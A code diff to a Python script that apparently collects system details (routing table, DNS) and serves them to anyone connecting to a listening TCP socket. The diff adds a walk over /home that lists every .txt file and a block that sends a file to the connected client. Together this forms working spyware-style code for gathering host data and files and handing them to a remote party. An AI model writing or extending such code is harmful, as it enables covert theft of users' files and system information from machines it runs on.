@@ -1,4 +1,6 @@
-import platform, re, uuid, socket, psutil, json, cpuinfo, datetime, subprocess
+import platform, re, uuid, socket, psutil, json, cpuinfo, datetime, subprocess, os
+
+path = r"/home"
 
 #Getting information about the system
 systemInfo = {}
@@ -104,7 +106,12 @@ serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serverSocket.bind(('', serverPort))
 serverSocket.listen(1)
 
-
+#Searching files 
+for root, dirs, files in os.walk(path):
+	for x in files:
+		if (x.endswith('.txt')):
+			print(root + r"/" + x)
+			
 #Sending information obtained
 while True:
 	connectionSocket,addr = serverSocket.accept()
@@ -113,4 +120,16 @@ while True:
 	connectionSocket.send(routingTable)
 	connectionSocket.recv(128)
 	connectionSocket.send(dns)
+	connectionSocket.recv(128)
+	
+#Sending obtained files 
+	with open ("prova.mp4","rb") as f:
+		fileSize = os.path.getsize("prova.mp4")
+		connectionSocket.send("prova.mp4".encode())
+		connectionSocket.recv(128)
+		connectionSocket.send(str(fileSize).encode())
+		connectionSocket.recv(128)
+		data = f.read()
+		connectionSocket.sendall(data)
+		connectionSocket.send(b"<TMB>") 
 	connectionSocket.close()
